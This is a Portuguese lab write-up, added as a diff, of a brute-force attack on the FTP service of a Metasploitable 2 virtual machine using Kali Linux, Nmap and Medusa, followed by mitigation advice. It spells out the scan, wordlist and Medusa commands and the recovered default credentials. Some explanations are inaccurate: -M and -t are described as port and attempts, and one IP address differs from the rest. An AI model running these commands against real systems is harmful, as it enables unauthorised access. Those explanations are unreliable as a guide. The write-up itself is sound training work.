@@ -1,0 +1,98 @@
+Cenário 1: Ataque de Força Bruta em FTP
+
+Objetivo:
+Simular um ataque de força bruta contra o serviço FTP da máquina Metasploitable 2 utilizando o Kali Linux e a ferramenta Medusa.
+
+---
+Configuração do Ambiente
+
+Duas máquinas virtuais foram utilizadas:
+
+-> Kali Linux (atacante)
+-> Metasploitable 2 (alvo) 
+
+Ambas configuradas no VirtualBox com rede **Host-Only Adapter**, permitindo comunicação interna isolada.
+
+---
+Teste de Conectividade
+
+Após configurar a rede, foi realizado um teste de comunicação entre as máquinas.
+
+-> ping -c 3 192.168.2.91
+
+---
+Enumeração de Portas
+
+Foi utilizado o Nmap para identificar portas abertas na máquina alvo:
+
+1 -> nmap 192.168.1.91
+2 -> nmap -sV -p 21,22,80,445,139 192.168.1.91
+
+---
+Teste de Acesso
+
+Depois de encontrar as portas foi feito um teste para ver se a porta estava funcionando.
+
+-> ftp 192.168.1.91
+
+Como eu ainda desconhecia o usuario e senha apenas sai.
+
+-> quit
+
+---
+Criação de Wordlists
+
+Foi criado um arquivo `.txt` contendo usuários e senhas comuns para esse tipo de ambiente vulnerável.
+
+-> echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+-> echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas.txt
+
+Essas listas foram utilizadas para simular um ataque de força bruta com credenciais conhecidas.
+
+---
+Execução do Ataque
+
+Após a criação das wordlists, foi utilizada a ferramenta Medusa para realizar o ataque de força bruta no serviço FTP.
+
+-> medusa -h 192.168.1.91 -U users.txt -P senhas.txt -M ftp -t 6
+
+-> (medusa) = Aplicação a ser utilizada.
+-> (-h) = Maquina a onde vai ser feito o ataque.
+-> (-U) = Arquivo.txt de onde ele vai tirar os usuarios.
+-> (-P) = Arquivo.txt de onde ele vai tirar as senhas.
+-> (-M) = A porta que ele vai tentar entrar.
+-> (-t) = Numeros de tentativas.
+
+Resultado:
+
+Com a execução do ataque de força bruta, foi possível identificar usuários e senhas válidos no serviço FTP.
+
+---
+Validação do Acesso
+
+Utilizando o mesmo comando para o teste de acesso eu obtive a validação do acesso.
+
+-> ftp 192.168.1.91
+
+Usuario:msfadmin
+Senha:msfadmin
+
+---
+Medidas de Mitigação:
+
+-> Utilizar senhas fortes e complexas
+-> Desabilitar autenticação FTP quando não necessário
+-> Implementar bloqueio após múltiplas tentativas
+-> Utilizar autenticação multifator (MFA)
+-> Monitorar logs de acesso
+-> Restringir acesso por IP
+
+---
+
+
+
+
+
+
+
+
